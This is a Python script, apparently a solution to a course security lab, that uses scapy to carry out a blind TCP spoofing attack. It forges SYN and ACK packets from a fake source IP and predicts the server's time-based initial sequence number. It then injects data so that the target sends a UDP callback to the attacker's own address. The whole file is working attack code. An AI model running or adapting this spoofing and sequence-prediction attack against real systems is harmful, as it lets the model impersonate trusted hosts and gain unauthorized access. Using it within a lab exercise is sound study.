import random
import socket
import threading
import time

from scapy.all import send
from scapy.layers.inet import IP, TCP

DHOST = "tcpspoof_cn.cse545.io"
FAKEIP = "10.2.4.10"
DPORT = 13337
SPORT = 23337
SIP = "172.16.20.23"

ss_ack = 0
dd_seq = 0
WORKING = True


def guess_SEQ():
    global ss_ack, dd_seq
    num = int(time.time())
    bs = num.to_bytes(length=4, byteorder="big", signed=False)
    n = list(bs)
    for _ in range(10):
        idx = (random.randint(10, 1000) % 3) + 1
        n[0] += n[idx]
        n[idx] = n[0] - n[idx]
        n[0] = n[0] - n[idx]
    bs = bytes(n)
    return int.from_bytes(bs, byteorder="big", signed=False) + 1


def connect():
    global ss_ack, dd_seq
    try:
        # 第一次握手，发送SYN包
        send(
            IP(dst=DHOST, src=FAKEIP) / TCP(dport=DPORT, sport=SPORT, seq=0, flags="S"),
            verbose=False,
        )
        ss_ack = 1
        dd_seq = guess_SEQ()
        # 第三次握手，发送ACK确认包
        pk = IP(dst=DHOST, src=FAKEIP) / TCP(
            dport=DPORT, sport=SPORT, ack=dd_seq, seq=ss_ack, flags="A"
        )
        send(pk, verbose=False)
    except Exception as e:
        print("[-]有错误，请注意检查！")
        print(e)


def send_data():
    global ss_ack, dd_seq
    pk = (
        IP(dst=DHOST, src=FAKEIP)
        / TCP(dport=DPORT, sport=SPORT, seq=ss_ack, ack=dd_seq, flags=24)
        / SIP
    )
    send(pk)


def receive():
    global WORKING
    IPv4 = "0.0.0.0"
    Port = 13337
    ServerSock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    ServerSock.bind((IPv4, Port))
    print("Socket is ready to receive data..")
    while WORKING:
        data, addr = ServerSock.recvfrom(1024)
        print("received data:", data)
        WORKING = False


if __name__ == "__main__":
    threading.Thread(target=receive).start()
    while WORKING:
        connect()
